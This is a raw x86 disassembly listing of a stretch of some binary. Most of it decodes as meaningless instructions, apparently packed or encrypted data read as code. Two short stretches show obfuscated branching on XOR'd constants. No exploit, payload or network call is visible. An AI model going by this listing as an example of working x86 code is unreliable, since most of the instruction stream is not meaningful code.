  408220:	cmp    cl,BYTE PTR [ebx+0x24]
  408223:	xchg   BYTE PTR [edi-0x4b],bh
  408226:	test   DWORD PTR [ebp+0x6e],edx
  408229:	mov    eax,0xab6b7939
  40822e:	push   esi
  40822f:	jg     0x40823e
  408231:	enter  0x6e0b,0x44
  408235:	loopne 0x4082aa
  408237:	jp     0x408244
  408239:	and    BYTE PTR [ebp+edi*4-0x28c444ba],cl
  408240:	jbe    0x408214
  408242:	dec    ebx
  408243:	retf   
  408244:	ret    0xa268
  408247:	adc    al,0x73
  408249:	mov    al,ds:0x51430d3b
  40824e:	out    0x75,eax
  408250:	mov    al,ds:0x2b6c92c
  408255:	scas   eax,DWORD PTR es:[edi]
  408256:	add    al,0x5f
  408258:	xlat   BYTE PTR ds:[ebx]
  408259:	enter  0x607a,0x29
  40825d:	leave  
  40825e:	push   0xffffff8a
  408260:	adc    eax,DWORD PTR [edx+0x30]
  408263:	arpl   WORD PTR [esp+eax*4-0x27ce694c],dx
  40826a:	pop    ebx
  40826b:	bound  ecx,QWORD PTR [eax+0x4f]
  40826e:	pop    ebp
  40826f:	sbb    al,0x5c
  408271:	stos   DWORD PTR es:[edi],eax
  408272:	xchg   edx,eax
  408273:	and    DWORD PTR [eax+0x37],esp
  408276:	or     al,BYTE PTR [ecx-0x611b8b57]
  40827c:	jbe    0x408248
  40827e:	sub    bh,BYTE PTR [esi+0x3d]
  408281:	ret    
  408282:	aas    
  408283:	rol    DWORD PTR [ecx-0x31],0x74
  408287:	fsubr  st,st(4)
  408289:	or     DWORD PTR [ebp+esi*8-0x5ee1d72f],esi
  408290:	sbb    BYTE PTR ds:0x4626b7bc,0xfa
  408297:	in     eax,dx
  408298:	stos   DWORD PTR es:[edi],eax
  408299:	mov    ch,0x25
  40829b:	jo     0x408277
  40829d:	pop    edi
  40829e:	inc    ecx
  40829f:	dec    ebx
  4082a0:	dec    edx
  4082a1:	xchg   DWORD PTR [ecx+0x69],edi
  4082a4:	call   0xfd61be85
  4082a9:	je     0x408259
  4082ab:	push   ebx
  4082ac:	push   ebx
  4082ad:	push   0xffffff8c
  4082af:	sub    eax,0xb5169f4c
  4082b4:	and    ebp,edx
  4082b6:	pushf  
  4082b7:	fisub  DWORD PTR [esi+0x68e5ff80]
  4082bd:	cmp    edi,DWORD PTR [edx+0x59333a40]
  4082c3:	dec    edx
  4082c4:	test   eax,0x87e1e311
  4082c9:	jmp    0x408342
  4082cb:	mov    al,0x92
  4082cd:	cs push esi
  4082cf:	xor    eax,0x9e33640d
  4082d4:	or     DWORD PTR [eax+0x1c],ebp
  4082d7:	in     al,dx
  4082d8:	fwait
  4082d9:	jmp    0xd940dd19
  4082de:	xor    al,bh
  4082e0:	sub    BYTE PTR [ebp-0x1c],bh
  4082e3:	xchg   edi,eax
  4082e4:	jb     0x4082c1
  4082e6:	jb     0x4082a3
  4082e8:	mov    ecx,0x8f14caf7
  4082ed:	sbb    DWORD PTR [ebx],esi
  4082ef:	sbb    al,0x47
  4082f1:	jl     0x4082df
  4082f3:	cmp    dh,cl
  4082f5:	pusha  
  4082f6:	sar    DWORD PTR [edx+0x6a2e2ca9],cl
  4082fc:	push   ecx
  4082fd:	fisttp DWORD PTR [esp+edx*4+0x40]
  408301:	outs   dx,BYTE PTR ds:[esi]
  408302:	jp     0x4082eb
  408304:	test   al,0xc1
  408306:	shl    DWORD PTR [ebx],0xd7
  408309:	and    BYTE PTR [eax],0x91
  40830c:	xchg   cl,dh
  40830e:	push   ss
  40830f:	mov    eax,ds:0xfecff54b
  408314:	pop    esi
  408315:	shl    esi,cl
  408317:	inc    eax
  408318:	shl    DWORD PTR [edx],cl
  40831a:	jae    0x4082f7
  40831c:	in     al,0x2c
  40831e:	mov    esi,0x8f372a7c
  408323:	xchg   ecx,eax
  408324:	rcr    DWORD PTR [ecx],cl
  408326:	mov    eax,ds:0xd6adc882
  40832b:	pop    edi
  40832c:	xchg   ebx,eax
  40832d:	dec    edi
  40832e:	jge    0x40833c
  408330:	sbb    DWORD PTR [esi+0x18],0xdbda3ae5
  408337:	int    0x5d
  408339:	jno    0x4082de
  40833b:	xor    eax,0x64fb6af8
  408340:	and    al,0xf3
  408342:	jo     0x408323
  408344:	cmp    al,0x7e
  408346:	xor    DWORD PTR [ecx],edx
  408348:	ins    DWORD PTR es:[edi],dx
  408349:	in     eax,0xd8
  40834b:	and    DWORD PTR [edi],ebp
  40834d:	out    0x3f,al
  40834f:	add    edi,edx
  408351:	into   
  408352:	dec    esp
  408353:	pop    esp
  408354:	sbb    esi,esi
  408356:	or     DWORD PTR [ecx+0x8],ebp
  408359:	fld    TBYTE PTR [esi+0x2d66d36]
  40835f:	sahf   
  408360:	fcom   QWORD PTR [esi-0x27]
  408363:	pop    esi
  408364:	clc    
  408365:	sub    eax,0x229e36c5
  40836a:	cmp    DWORD PTR [eax-0x428ca7c2],ebx
  408370:	ret    0xa42f
  408373:	leave  
  408374:	dec    edx
  408375:	cli    
  408376:	dec    dl
  408378:	rol    BYTE PTR [eax],cl
  40837a:	inc    edi
  40837b:	clc    
  40837c:	jnp    0x4083f8
  40837e:	xchg   ebx,eax
  40837f:	stos   BYTE PTR es:[edi],al
  408380:	jne    0x4083da
  408382:	rcr    BYTE PTR [edx],0x51
  408385:	jecxz  0x408367
  408387:	pop    es
  408388:	jmp    0xcb26:0x11e33719
  40838f:	sub    al,0x18
  408391:	fmul   DWORD PTR [edi+esi*4+0x23eac772]
  408398:	dec    ebp
  408399:	inc    eax
  40839a:	cmp    al,0xe6
  40839c:	mov    ecx,DWORD PTR [ebx+0x72]
  40839f:	push   ecx
  4083a0:	xor    edx,esp
  4083a2:	or     ch,BYTE PTR [eax+0x620de7c]
  4083a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083a9:	in     eax,0x3c
  4083ab:	xchg   esi,eax
  4083ac:	mov    cs,ebx
  4083ae:	or     al,0xbe
  4083b0:	mov    dh,0x87
  4083b2:	inc    ecx
  4083b3:	stc    
  4083b4:	(bad)  
  4083b5:	scas   al,BYTE PTR es:[edi]
  4083b6:	jl     0x40835a
  4083b8:	or     eax,0x337216f
  4083bd:	cmp    esp,eax
  4083bf:	sbb    al,BYTE PTR [ebx]
  4083c1:	bound  ebp,QWORD PTR [edi+0x2]
  4083c4:	or     al,0xd6
  4083c6:	out    0xa1,eax
  4083c8:	rcr    DWORD PTR gs:[eax+0x1715191e],0x5
  4083d0:	cmp    eax,0x93d61189
  4083d5:	or     cl,ch
  4083d7:	aaa    
  4083d8:	xchg   ebp,eax
  4083d9:	mov    esp,0xfe69a83d
  4083de:	pop    ebx
  4083df:	outs   dx,BYTE PTR ds:[esi]
  4083e0:	call   0x9070:0x49e13152
  4083e7:	bound  eax,QWORD PTR [ecx-0x252b502e]
  4083ed:	push   0xcbcb25c5
  4083f2:	mov    dl,al
  4083f4:	fwait
  4083f5:	sbb    al,0x20
  4083f7:	mov    WORD PTR [ecx+0x1ea0cf6],gs
  4083fd:	push   es
  4083fe:	mov    ah,0xfc
  408400:	mov    ch,0xed
  408402:	dec    eax
  408403:	retf   0xcffd
  408406:	cmp    eax,0x76a09255
  40840b:	(bad)
  40840e:	push   es
  40840f:	xor    ah,BYTE PTR [edx+0xa43cfd7]
  408415:	aam    0x2d
  408417:	sbb    BYTE PTR [esi-0x8],dh
  40841a:	in     eax,dx
  40841b:	sbb    eax,0xc83dd9c0
  408420:	arpl   WORD PTR [ecx+0x12c636c6],si
  408426:	gs dec edx
  408428:	adc    al,0x4d
  40842a:	stos   BYTE PTR es:[edi],al
  40842b:	sbb    al,0x6d
  40842d:	jg     0x40846f
  40842f:	int3   
  408430:	iret   
  408431:	mov    bh,0xf1
  408433:	sbb    BYTE PTR [esi],al
  408435:	cwde   
  408436:	aad    0xd1
  408438:	dec    ebp
  408439:	xchg   ebx,eax
  40843a:	fwait
  40843b:	mov    eax,0x35f3c09b
  408440:	test   al,0x26
  408442:	sub    BYTE PTR [ebp+0x3d220c9a],ch
  408448:	push   esp
  408449:	mov    ecx,0x186bb04c
  40844e:	cmp    ah,dh
  408450:	cmc    
  408451:	mov    ds:0xc6c1c5fc,al
  408456:	cmp    DWORD PTR [edx+0x260eee70],esi
  40845c:	and    al,0xa7
  40845e:	(bad)  
  40845f:	aad    0xad
  408461:	(bad)  
  408462:	sub    bh,BYTE PTR [ebp-0x445015b4]
  408468:	adc    DWORD PTR [ecx-0x37b7d56c],esi
  40846e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40846f:	add    al,0x24
  408471:	cdq    
  408472:	sbb    DWORD PTR [esi+0x2f],0x76a4a6ba
  408479:	dec    edx
  40847a:	addr16 mov bl,0xd4
  40847d:	jnp    0x4084bd
  40847f:	mov    WORD PTR [eax],?
  408481:	ss stos DWORD PTR es:[edi],eax
  408483:	add    al,0x74
  408485:	sbb    eax,0x2655cdb3
  40848a:	sub    al,0x32
  40848c:	nop
  40848d:	(bad)  
  40848e:	fsubr  QWORD PTR [eax+0x18]
  408491:	cld    
  408492:	cmp    DWORD PTR [ecx-0x6db0f063],ebx
  408498:	add    BYTE PTR [ecx],dl
  40849a:	cwde   
  40849b:	test   DWORD PTR [eax],0x553ad585
  4084a1:	adc    eax,0xfb0324
  4084a6:	jmp    FWORD PTR [ebx]
  4084a8:	loope  0x408472
  4084aa:	cdq    
  4084ab:	cmp    DWORD PTR gs:[eax],ebx
  4084ae:	leave  
  4084af:	mov    edi,0x33a2f92e
  4084b4:	jle    0x408520
  4084b6:	and    edi,esp
  4084b8:	mov    bl,0x88
  4084ba:	mov    eax,DWORD PTR [ebp-0x8]
  4084bd:	xor    eax,ecx
  4084bf:	add    eax,esi
  4084c1:	pop    edi
  4084c2:	pop    esi
  4084c3:	pop    ebx
  4084c4:	leave  
  4084c5:	ret    0x4
  4084c8:	mov    eax,DWORD PTR [ebp-0xc]
  4084cb:	add    eax,DWORD PTR [ebp-0x18]
  4084ce:	cmp    eax,0x50b25e45
  4084d3:	je     0x4084e7
  4084d9:	mov    eax,DWORD PTR [ebp-0x10]
  4084dc:	and    DWORD PTR [eax],0x751c9d
  4084e2:	jmp    0x4084ba
  4084e7:	mov    eax,DWORD PTR [ebp-0xc]
  4084ea:	mov    edx,DWORD PTR [ebp-0x18]
  4084ed:	or     eax,edx
  4084ef:	cmp    eax,0xf89f3dbd
  4084f4:	je     0x40887e
  4084fa:	mov    eax,DWORD PTR [ebp-0x10]
  4084fd:	jmp    0x408873
  408502:	pop    esi
  408503:	sahf   
  408504:	pop    edi
  408505:	pop    es
  408506:	pop    edi
  408507:	shl    DWORD PTR [esi+0x61],0xde
  40850b:	cdq    
  40850c:	outs   dx,BYTE PTR ds:[esi]
  40850d:	pop    esi
  40850e:	outs   dx,BYTE PTR ds:[esi]
  40850f:	pop    esi
  408510:	xchg   esp,eax
  408511:	jle    0x408545
  408513:	fidivr WORD PTR [esp+edi*2-0x29]
  408517:	jns    0x408595
  408519:	jl     0x40853e
  40851b:	setae  BYTE PTR [edi]
  40851e:	cwde   
  40851f:	dec    ecx
  408520:	nop
  408521:	aas    
  408522:	xchg   DWORD PTR [eax-0x18],ecx
  408525:	sub    al,0x16
  408527:	and    dl,ch
  408529:	sub    ebx,ebp
  40852b:	call   0x1be9:0xd2c63083
  408532:	mov    ebx,0x340864be
  408537:	or     BYTE PTR [esi-0x6b],bh
  40853a:	inc    eax
  40853b:	inc    esp
  40853c:	add    eax,0x61062a5
  408541:	add    DWORD PTR [esp+ebp*4],eax
  408544:	mov    al,0xdd
  408546:	inc    eax
  408547:	dec    edx
  408548:	cmp    bl,BYTE PTR gs:[edi]
  40854b:	sub    al,0x9a
  40854d:	aas    
  40854e:	(bad)  
  40854f:	pop    ebp
  408550:	sahf   
  408551:	pop    edx
  408552:	div    DWORD PTR [esi]
  408554:	or     al,0x10
  408556:	sahf   
  408557:	aad    0xef
  408559:	pop    ebx
  40855a:	adc    DWORD PTR [ecx+0x68],edi
  40855d:	(bad)  
  40855e:	and    BYTE PTR [esi],ch
  408560:	mov    bl,0x1e
  408562:	mov    ebp,0xb99a1460
  408567:	outs   dx,DWORD PTR ds:[esi]
  408568:	mov    cl,0x49
  40856a:	ror    DWORD PTR [esp+ebp*2+0x4b8b9325],cl
  408571:	sar    DWORD PTR [esi+0x11],1
  408574:	sbb    eax,0x170d5333
  408579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40857a:	imul   eax,DWORD PTR [eax+0x27],0x407789de
  408581:	lods   eax,DWORD PTR ds:[esi]
  408582:	jmp    0xba19:0xf89bcd8e
  408589:	adc    BYTE PTR [eax+0x3d],bl
  40858c:	push   cs
  40858d:	push   cs
  40858e:	in     al,dx
  40858f:	cmp    DWORD PTR [eax+0x78e6ff80],ecx
  408595:	xor    bh,ah
  408597:	and    esp,ecx
  408599:	xlat   BYTE PTR ds:[ebx]
  40859a:	out    dx,al
  40859b:	mov    ah,0x81
  40859d:	sub    ch,BYTE PTR [eax-0x6f1bc7c4]
  4085a3:	adc    eax,0xfe233ed4
  4085a8:	add    al,0xed
  4085aa:	inc    esi
  4085ab:	and    cl,BYTE PTR [ebp+0x29]
  4085ae:	in     al,0xb2
  4085b0:	ds pop esp
  4085b2:	adc    DWORD PTR [edi],eax
  4085b4:	jmp    0x5a0a:0xc4a22bcd
  4085bb:	xor    eax,0x286c9d0b
  4085c0:	jmp    0x408639
  4085c2:	mov    fs,WORD PTR [edx-0x70]
  4085c5:	das    
  4085c6:	pop    DWORD PTR [edx*4+0x4da511c]
  4085cd:	push   es
  4085ce:	mov    esi,?
  4085d0:	(bad)  
  4085d1:	push   ebp
  4085d2:	loopne 0x40861d
  4085d4:	pop    ss
  4085d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085d6:	shl    DWORD PTR [edi+edx*1-0x64],0x2b
  4085db:	ss mov edx,0xd6dc207c
  4085e1:	std    
  4085e2:	test   eax,0xe2b4ee5b
  4085e7:	mov    ecx,DWORD PTR [edx-0x6f38d108]
  4085ed:	sub    eax,ebp
  4085ef:	push   ds
  4085f0:	mov    ah,0x5a
  4085f2:	and    edi,esp
  4085f4:	pop    esp
  4085f5:	das    
  4085f6:	jl     0x408672
  4085f8:	outs   dx,BYTE PTR ds:[esi]
  4085f9:	retf   0x4a07
  4085fc:	jp     0x4085f8
  4085fe:	gs xchg ebx,eax
  408600:	mov    bl,0xbf
  408602:	pusha  
  408603:	jmp    0x74c10f21
  408608:	jns    0x4085a9
  40860a:	fmul   DWORD PTR [eax-0x63bfd263]
  408610:	aaa    
  408611:	and    dl,ch
  408613:	data16 int 0x56
  408616:	mov    al,0xc
  408618:	or     al,0xcf
  40861a:	mov    eax,0xef896762
  40861f:	adc    edi,DWORD PTR [esi-0x400ce437]
  408625:	jp     0x408687
  408627:	inc    eax
  408628:	repnz adc BYTE PTR [eax+0x11],bl
  40862c:	scas   eax,DWORD PTR es:[edi]
  40862d:	dec    edi
  40862e:	fcmovbe st,st(0)
  408630:	xchg   ecx,eax
  408631:	push   eax
  408632:	imul   eax,edi,0xffffff94
  408635:	fcomp  QWORD PTR [ebx-0x197a8efa]
  40863b:	pop    esi
  40863c:	cmp    BYTE PTR [eax-0x4f349bdc],dl
  408642:	mul    BYTE PTR [esi+0x1a]
  408645:	mov    ds:0xd02ea4ab,eax
  40864a:	cwde   
  40864b:	mov    esi,0x395b0d1d
  408650:	ss pop edx
  408652:	push   ds
  408653:	test   cl,dl
  408655:	scas   eax,DWORD PTR es:[edi]
  408656:	jecxz  0x408671
  408658:	adc    BYTE PTR [ecx],0xb8
  40865b:	lods   al,BYTE PTR ds:[esi]
  40865c:	inc    edi
  40865d:	out    dx,eax
  40865e:	repnz cli 
  408660:	and    bl,al
  408662:	dec    esi
  408663:	popa   
  408664:	and    al,0x46
  408666:	(bad)  
  408667:	repnz not DWORD PTR [edx+edx*8-0x46d756c9]
  40866f:	inc    esi
  408670:	retf   
  408671:	jl     0x408650
  408673:	mov    bh,BYTE PTR cs:[edi+0x6e8bbe29]
  40867a:	or     cl,BYTE PTR [edx-0xb636d60]
  408680:	cmp    eax,0x1c23633f
  408685:	adc    DWORD PTR [edi+0x40e30f48],eax
  40868b:	xchg   esp,eax
  40868c:	addr16 nop
  40868e:	pop    edi
  40868f:	stos   DWORD PTR es:[edi],eax
  408690:	(bad)  
  408691:	jmp    0x40861d
  408693:	lea    eax,[ebx-0x3e5fa0c4]
  408699:	inc    edi
  40869a:	js     0x4086a2
  40869c:	jne    0x408664
  40869e:	mov    ah,0x1c
  4086a0:	dec    ebp
  4086a1:	icebp  
  4086a2:	add    eax,0x78fde4f8
  4086a7:	adc    al,0xf4
  4086a9:	lahf   
  4086aa:	cmp    bl,bh
  4086ac:	pop    edi
  4086ad:	cmc    
  4086ae:	ds dec eax
  4086b0:	test   eax,0x379cfac7
  4086b5:	out    0xcc,al
  4086b7:	xlat   BYTE PTR ds:[ebx]
  4086b8:	pop    edx
  4086b9:	rcl    eax,0x6b
  4086bc:	repnz outs dx,BYTE PTR ds:[esi]
  4086be:	add    al,ch
  4086c0:	add    al,0x71
  4086c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086c3:	inc    ebp
  4086c4:	mov    bl,0xac
  4086c6:	xlat   BYTE PTR ds:[ebx]
  4086c7:	ins    DWORD PTR es:[edi],dx
  4086c8:	mov    ?,WORD PTR [edx]
  4086ca:	mul    DWORD PTR [esp+ebx*2]
  4086cd:	mov    dl,0xab
  4086cf:	shld   DWORD PTR [ebx+0x22],edx,0x7d
  4086d4:	pop    ebx
  4086d5:	push   esi
  4086d6:	dec    eax
  4086d7:	pop    ss
  4086d8:	xor    esp,DWORD PTR [ecx]
  4086da:	adc    eax,0x35e88882
  4086df:	test   DWORD PTR [eax],esp
  4086e1:	push   edi
  4086e2:	mov    dl,0x82
  4086e4:	aas    
  4086e5:	repnz lods al,BYTE PTR ds:[esi]
  4086e7:	pop    edx
  4086e8:	jnp    0x408724
  4086ea:	jb     0x40870f
  4086ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086ed:	out    dx,eax
  4086ee:	stos   DWORD PTR es:[edi],eax
  4086ef:	clc    
  4086f0:	clc    
  4086f1:	or     BYTE PTR [ecx-0xbeb68b0],bh
  4086f7:	xor    eax,0x4be63211
  4086fc:	add    al,0xb1
  4086fe:	or     esi,ebx
  408700:	pop    ebp
  408701:	in     al,dx
  408702:	je     0x4086b8
  408704:	ins    DWORD PTR es:[edi],dx
  408705:	call   0xefa0:0x7592e529
  40870c:	inc    eax
  40870d:	sahf   
  40870e:	icebp  
  40870f:	sar    BYTE PTR [edx-0x68],cl
  408712:	jp     0x408779
  408714:	ss (bad) 
  408716:	fsub   QWORD PTR [ebp+0x7f]
  408719:	dec    ebp
  40871a:	adc    BYTE PTR [ecx+0x5ca51a0f],dl
  408720:	mov    ds:0xab24fc94,eax
  408725:	nop
  408726:	jp     0x408727
  408728:	(bad)  
  40872b:	xor    eax,0xcdc2e7ad
  408730:	and    eax,0x20b030ff
  408735:	cmp    al,0x51
  408737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408739:	add    ecx,eax
  40873b:	mov    edx,0xe0cb51e7
  408740:	mov    eax,ds:0xb2187aef
  408745:	jo     0x408726
  408747:	sub    BYTE PTR [ecx],cl
  408749:	mov    cl,0x39
  40874b:	xlat   BYTE PTR ds:[ebx]
  40874c:	pop    eax
  40874d:	mov    ebp,0x8ff67a6a
  408752:	jge    0x4087b7
  408754:	ds xor ah,cl
  408757:	test   DWORD PTR [edi-0x48],edx
  40875a:	sbb    edx,DWORD PTR [ebx]
  40875c:	pop    ebx
  40875d:	popf   
  40875e:	adc    ah,dh
  408760:	mov    ecx,0x5f0a9185
  408765:	inc    ebx
  408766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408767:	push   es
  408768:	retf   0x1941
  40876b:	shl    ecx,cl
  40876d:	sbb    eax,0x40b64ee9
  408772:	xchg   ebp,eax
  408773:	or     al,0x47
  408775:	stc    
  408776:	aad    0xee
  408778:	in     al,dx
  408779:	dec    ebx
  40877a:	pop    ecx
  40877b:	lods   eax,DWORD PTR ds:[esi]
  40877c:	ret    0xfe4e
  40877f:	clc    
  408780:	push   ecx
  408781:	jb     0x408779
  408783:	ds push 0xd511c089
  408789:	jae    0x40874f
  40878b:	xchg   ebp,eax
  40878c:	xchg   ebp,eax
  40878d:	pop    esi
  40878e:	fld    DWORD PTR [esi]
  408790:	jmp    0x7fa3:0x973e509b
  408797:	fwait
  408798:	dec    ecx
  408799:	xor    BYTE PTR [ebx-0x74253b09],0xc8
  4087a0:	cmc    
  4087a1:	fstp   QWORD PTR [ebp+0x7a678ca1]
  4087a7:	ins    DWORD PTR es:[edi],dx
  4087a8:	repz push edi
  4087aa:	outs   dx,DWORD PTR ds:[esi]
  4087ab:	test   al,0xa8
  4087ad:	test   DWORD PTR [esi+ebx*1-0x68c9058d],ebx
  4087b4:	les    esi,FWORD PTR [ebx]
  4087b6:	aaa    
  4087b7:	ret    0x68f2
  4087ba:	retf   
  4087bb:	ins    DWORD PTR es:[edi],dx
  4087bc:	(bad)  
  4087bd:	dec    ebx
  4087be:	push   cs
  4087bf:	pop    edx
  4087c0:	xor    eax,0x94f75a81
  4087c5:	imul   ebx,DWORD PTR ss:[edi+0x1a],0xcb9854a0
  4087cd:	neg    dh
  4087cf:	jl     0x40876f
  4087d1:	dec    edx
  4087d2:	xchg   ebp,eax
  4087d3:	mov    eax,ds:0x8b92abd6
  4087d8:	fld    QWORD PTR [ebx-0x4b9fadaf]
  4087de:	xlat   BYTE PTR ds:[ebx]
  4087df:	(bad)  
  4087e0:	sub    ebx,esp
  4087e2:	or     DWORD PTR [ebp-0x2898e74f],0xd502223b
  4087ec:	stos   DWORD PTR es:[edi],eax
  4087ed:	adc    al,0x60
  4087ef:	(bad)  
  4087f0:	inc    BYTE PTR [edx+0x73]
  4087f3:	sub    al,0xc9
  4087f5:	das    
  4087f6:	stc    
  4087f7:	or     BYTE PTR [eax-0x138d5432],0xc4
  4087fe:	pop    cx
  408800:	ds mov dh,0x32
  408803:	mov    al,ds:0x1f2c2974
  408808:	mov    ch,0x8a
  40880a:	out    dx,eax
  40880b:	fsub   DWORD PTR [edi+0x8]
  40880e:	lahf   
  40880f:	pop    esi
  408810:	in     eax,dx
  408811:	in     al,0x48
  408813:	int3   
  408814:	mov    DWORD PTR [eax],eax
  408816:	sub    DWORD PTR [edi+0x6b372c1c],ebp
  40881c:	push   es
  40881d:	vpmacssww ymm15,ymm4,YMMWORD PTR [edx-0x6c6b6a16],ymm5
  408827:	sub    DWORD PTR [ecx],esi
  408829:	sbb    DWORD PTR [edx-0x68],esi
  40882c:	inc    esp
  40882d:	sbb    al,0x2
  40882f:	dec    ecx
  408830:	div    BYTE PTR [eax*8+0x1c4f2633]
  408837:	pop    esp
  408838:	je     0x4087e7
  40883a:	gs mov ch,0x76
  40883d:	test   eax,0xce1d61c7
  408842:	sub    BYTE PTR [ecx-0x316b350a],al
  408848:	jo     0x4088c3
  40884a:	jp     0x40889c
  40884c:	or     al,BYTE PTR [eax+0x57fe8d88]
  408852:	mul    DWORD PTR [eax+0x2bb630ab]
  408858:	shl    ebp,0x31
  40885b:	mov    fs,WORD PTR [eax+0x6e942701]
  408861:	data16 adc BYTE PTR [edi],bh
  408864:	push   ebp
  408865:	call   0x3497651b
  40886a:	lds    edi,FWORD PTR [edi+ebx*2-0x6a]
  40886e:	cmp    BYTE PTR [esi-0x7ea2bacf],0x30
  408875:	(bad)  
  408876:	cli    
  408877:	push   eax
  408878:	es jmp 0x4084ba
  40887e:	mov    ax,WORD PTR [ebp-0x4]
  408882:	mov    edi,DWORD PTR [ebp+0x8]
  408885:	mov    edi,DWORD PTR [edi]
  408887:	mov    edx,0x8a3a
  40888c:	xor    ax,dx
  40888f:	mov    edx,0x3b00
  408894:	add    ax,dx
  408897:	cmp    ax,WORD PTR [edi]
  40889a:	je     0x409349
  4088a0:	mov    eax,DWORD PTR [ebp-0x14]
  4088a3:	xor    eax,ecx
  4088a5:	add    eax,esi
  4088a7:	mov    DWORD PTR [ebp-0x24],eax
  4088aa:	mov    eax,DWORD PTR [ebp-0x28]
  4088ad:	mov    di,WORD PTR [ebp-0x2c]
  4088b1:	mov    ebx,0x8a3a
  4088b6:	xor    di,bx
  4088b9:	add    di,dx
  4088bc:	movzx  edx,di
  4088bf:	mov    edi,DWORD PTR [ebp-0x8]
  4088c2:	xor    edi,ecx
  4088c4:	lea    edx,[edx+edi*1+0x32729a]
  4088cb:	add    DWORD PTR [eax],edx
  4088cd:	jmp    0x408c43
  4088d2:	add    al,0x63
  4088d4:	loop   0x4088d0
  4088d6:	ins    DWORD PTR es:[edi],dx
  4088d7:	test   DWORD PTR [ebp+ebp*2+0xe],esp
  4088db:	loop   0x408905
  4088dd:	add    al,0x69
  4088df:	(bad)  
  4088e0:	rcl    DWORD PTR [ebx-0x6b],cl
  4088e3:	fstp   TBYTE PTR [esp+edi*2-0x29]
  4088e7:	jns    0x408965
  4088e9:	jl     0x408936
  4088eb:	imul   esp,DWORD PTR [eax+0x4c8b5677],0xffffff83
  4088f2:	add    dh,BYTE PTR [esi]
  4088f4:	push   cs
  4088f5:	(bad)  
  4088f6:	mov    esi,0xb4845dd2
  4088fb:	loop   0x4088a7
  4088fd:	mov    bl,0x8c
  4088ff:	dec    ebp
  408900:	xor    bl,ch
  408902:	xchg   edx,eax
  408903:	adc    bh,BYTE PTR [ebx-0x8f5d36c]
  408909:	mov    ah,0x99
  40890b:	pop    esp
  40890c:	jge    0x4088c8
  40890e:	rcl    DWORD PTR [edx+0x28],cl
  408911:	add    DWORD PTR [eax+0x1b],esi
  408914:	adc    DWORD PTR [ebx-0x6fd94550],ebx
  40891a:	jle    0x408995
  40891c:	sub    dl,BYTE PTR [esi+0x61f41924]
  408922:	xchg   esi,eax
  408923:	mov    ds:0x52c860ce,al
  408928:	iret   
  408929:	push   cs
  40892a:	aas    
  40892b:	mov    esp,0x26382230
  408930:	scas   eax,DWORD PTR es:[edi]
  408931:	xchg   edx,eax
  408932:	loope  0x408999
  408934:	sahf   
  408935:	ret    
  408936:	ss enter 0xf024,0xe1
  40893b:	in     eax,0x96
  40893d:	jb     0x4088c3
  40893f:	shl    DWORD PTR [ebx-0x65],0x13
  408943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408944:	inc    esp
  408945:	xchg   esi,eax
  408946:	bound  edi,QWORD PTR [eax]
  408948:	fmul   QWORD PTR [ecx]
  40894a:	in     al,dx
  40894b:	xor    dh,dh
  40894d:	xchg   esp,eax
  40894e:	dec    esp
  40894f:	xchg   ebp,eax
  408950:	jnp    0x408968
  408952:	cdq    
  408953:	cmp    al,0xf3
  408955:	mov    ah,0x9a
  408957:	adc    DWORD PTR [edi+edx*8],edi
  40895a:	push   esp
  40895b:	xchg   edx,eax
  40895c:	rol    DWORD PTR [ecx],1
  40895e:	ja     0x408959
  408960:	and    eax,edi
  408962:	xchg   ebp,eax
  408963:	out    0xbd,eax
  408965:	pop    ss
  408966:	les    ecx,FWORD PTR [eax+0x4a]
  408969:	or     al,0x3e
  40896b:	retf   0xf66
  40896e:	add    BYTE PTR [ebx+0x47],ch
  408971:	int    0x94
  408973:	repz test esp,esp
  408976:	jp     0x408960
  408978:	xchg   edx,eax
  408979:	dec    ebx
  40897a:	imul   esp,esi,0x3ed24eb3
  408980:	imul   ecx,DWORD PTR [edx+0x7a07a2b],0x23
  408987:	add    eax,0x9c45c3ef
  40898c:	sub    BYTE PTR ds:0x80f72ea0,dh
  408992:	xchg   edi,eax
  408993:	cld    
  408994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408995:	inc    edx
  408996:	outs   dx,DWORD PTR ds:[esi]
  408997:	inc    BYTE PTR [edi-0x7]
  40899a:	(bad)  
  40899c:	aad    0xd3
  40899e:	shl    BYTE PTR [ebx-0x430a219],0xd4
  4089a5:	fisttp QWORD PTR [edx-0x3d]
  4089a8:	out    0xc5,eax
  4089aa:	pop    esp
  4089ab:	cmp    eax,0x1ce78d39
  4089b0:	test   eax,0xb68695e9
  4089b5:	xor    eax,0x677a481a
  4089ba:	repnz adc ecx,DWORD PTR [edi+0x26]
  4089be:	in     al,0x35
  4089c0:	pop    eax
  4089c1:	nop
  4089c2:	xchg   edi,esi
  4089c4:	push   eax
  4089c5:	(bad)  
  4089c6:	jmp    0xd129:0x66100350
  4089cd:	push   ds
  4089ce:	aaa    
  4089cf:	jp     0x408a3b
  4089d1:	mov    ecx,0xe8a1f168
  4089d6:	jp     0x40897c
  4089d8:	fcom   QWORD PTR [ebx+ebx*8-0x4590d2cb]
  4089df:	cld    
  4089e0:	add    esp,DWORD PTR [ecx]
  4089e2:	daa    
  4089e3:	je     0x4089c9
  4089e5:	adc    al,0x3d
  4089e7:	repz sbb dl,BYTE PTR ds:0xa3ae75be
  4089ee:	jbe    0x4089df
  4089f0:	out    0x9c,eax
  4089f2:	into   
  4089f3:	ffreep st(2)
  4089f5:	leave  
  4089f6:	push   cs
  4089f7:	fcom   QWORD PTR [esp-0x754e4102]
  4089fe:	popa   
  4089ff:	push   ds
  408a00:	or     BYTE PTR [esi],0x64
  408a03:	adc    DWORD PTR [eax-0x2aa0012e],ebx
  408a09:	test   eax,0xf5bb2e3d
  408a0e:	ja     0x408a7e
  408a10:	mov    bl,0x5b
  408a12:	mov    al,ds:0xdbcc0668
  408a17:	(bad)  
  408a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
